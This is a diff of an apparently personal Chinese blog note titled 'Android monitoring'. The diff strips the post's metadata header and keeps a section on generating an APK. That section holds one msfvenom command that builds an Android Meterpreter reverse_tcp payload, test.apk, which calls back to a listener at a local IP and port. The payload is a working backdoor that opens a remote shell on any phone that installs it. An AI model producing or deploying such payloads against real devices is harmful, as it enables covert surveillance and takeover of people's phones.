@@ -1,10 +1,3 @@
----
-title: 安卓监听
-date: 2023/01/19 18:42
-location: 东莞
-tags: 原创 Linux Metasploit
----
-
 ## 生成 apk 文件
 ```sh
 msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.106 lport=8848 > test.apk
